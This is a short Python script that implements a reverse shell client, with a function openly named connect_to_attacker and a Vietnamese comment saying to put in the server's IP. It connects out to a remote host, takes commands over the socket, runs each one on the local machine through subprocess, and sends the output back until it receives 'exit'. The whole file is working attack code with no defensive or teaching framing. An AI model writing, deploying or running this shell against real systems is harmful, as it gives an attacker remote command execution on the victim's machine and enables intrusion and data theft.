import socket
import subprocess

def connect_to_attacker(server_ip='127.0.0.1', server_port=9999):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))
    print(f"Connected to {server_ip}:{server_port}")

    while True:
        command = client.recv(1024).decode('utf-8')
        if command.lower() == 'exit':
            break
        if command:
            output = subprocess.getoutput(command)
            client.send(output.encode('utf-8'))

    client.close()

if __name__ == "__main__":
    connect_to_attacker('192.168.1.10', 9999)  # Thay '192.168.1.10' bằng IP của server
